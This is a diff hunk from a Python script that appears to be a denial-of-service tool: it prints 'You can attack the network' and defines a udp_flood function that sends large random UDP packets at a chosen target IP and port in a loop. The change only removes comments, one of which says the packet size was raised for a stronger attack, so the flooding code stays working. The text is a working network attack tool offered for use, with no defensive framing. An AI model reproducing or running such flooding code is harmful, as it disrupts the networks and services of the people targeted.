@@ -34,14 +34,14 @@ print("-You can attack the network🚀 ")
 print("""
 """ )
 
-# Function to send UDP packets to a specific target
+
 def udp_flood(target_ip, target_port, count, packets_per_process=1000):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    data = random._urandom(8192)  # Increased packet size to 8192 bytes for stronger attack
+    data = random._urandom(8192)  
     while count < packets_per_process:
-        client.sendto(data, (target_ip, target_port))  # Send the packet to the target
+        client.sendto(data, (target_ip, target_port))  
         count += 1
-        if count % 100 == 0:  # Print every 100 packets sent
+        if count % 100 == 0:  
             print(f"Sent {count} packets to {target_ip}:{target_port}")
 
 # Function to start the attack using multiprocessing
